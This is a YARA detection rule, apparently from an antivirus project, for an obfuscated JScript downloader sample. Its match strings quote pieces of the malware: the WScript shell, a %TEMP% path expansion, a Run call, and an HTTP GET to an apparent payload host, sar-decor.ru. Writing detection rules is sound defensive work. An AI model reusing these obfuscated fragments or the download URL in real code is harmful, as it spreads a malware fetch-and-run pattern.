rule sig_20160428_f4a6273c637c02b177037a4d39bfef70 {
  meta:
    description = "datamaliciousorder - file 20160428_f4a6273c637c02b177037a4d39bfef70.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a64b05f1f3599310c7b8292cf3698879e7bd41695dcc0daa078f14340e2edbe6"

  strings:
    $s1  = "function DzdBsmWeiXgeAmsHzzTyh(WeyGfzRngYgoExlYpdXdo){LldBgrIqhTiyYalPesOhn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function GxlAvsCjyGbfVxkRqtTkh() {return LldBgrIqhTiyYalPesOhn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function DzdBsmWeiXgeAmsHzzTyh(WeyGfzRngYgoExlYpdXdo){LldBgrIqhTiyYalPesOhn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return YclDgiFooXwxNlfWrlDqu - IdeNtbOjfUkzRtgTugKoy;};" fullword ascii
    $s5  = "var LldBgrIqhTiyYalPesOhn = function SilEvxUnxMudNiwYkjUkl() {return GviPjqQvmUnxXehYjhNeu[CmcDvgHvhJxwEpsWdzDyu](\"WScript\"+\"" ascii
    $s6  = "function MhzJgjSolEfqHkyIaqOer(YclDgiFooXwxNlfWrlDqu, IdeNtbOjfUkzRtgTugKoy){DboWvwYmkKzaNftYrjEat = DboWvwYmkKzaNftYrjEat * 1; " ascii
    $s7  = "QxqJtqItcEtbQfoHbmOfa[HpbYfqShcFcgAybVpqVeb](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s8  = "var GviPjqQvmUnxXehYjhNeu = this[\"WScript\"];" fullword ascii
    $s9  = "var LldBgrIqhTiyYalPesOhn = function SilEvxUnxMudNiwYkjUkl() {return GviPjqQvmUnxXehYjhNeu[CmcDvgHvhJxwEpsWdzDyu](\"WScript\"+\"" ascii
    $s10 = "function GxlAvsCjyGbfVxkRqtTkh() {return LldBgrIqhTiyYalPesOhn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function MhzJgjSolEfqHkyIaqOer(YclDgiFooXwxNlfWrlDqu, IdeNtbOjfUkzRtgTugKoy){DboWvwYmkKzaNftYrjEat = DboWvwYmkKzaNftYrjEat * 1; " ascii
    $s12 = "function BxmJyqFjoRvqIoxSlxZmt(){return ZgiAehPuuWvwBhsOqwNtd + \"\";};" fullword ascii
    $s13 = "if (QxqJtqItcEtbQfoHbmOfa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function DibCbbOccSwhOluWjzUow() {return ((UaoChlHjzPhjShzKawNim == true) && (UaoChlHjzPhjShzKawNim == FplFxqInaTyyDxlZtrKdy)) ?" ascii
    $s15 = "function DibCbbOccSwhOluWjzUow() {return ((UaoChlHjzPhjShzKawNim == true) && (UaoChlHjzPhjShzKawNim == FplFxqInaTyyDxlZtrKdy)) ?" ascii
    $s16 = "MtkCynFkdBabYdvDyrFbp = true;" fullword ascii
    $s17 = "UaoChlHjzPhjShzKawNim = true; " fullword ascii
    $s18 = "return MhzJgjSolEfqHkyIaqOer(1 == 1 ? JjlNauLtoWjrDmfAbaOev : 0, 1 == 1 ? XxqHxhYodWzdUldOnlUeg : 0);" fullword ascii
    $s19 = "function DvpFyvRdyFkrZdxKotKdj(){return CmcDvgHvhJxwEpsWdzDyu;};" fullword ascii
    $s20 = "var UaoChlHjzPhjShzKawNim = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}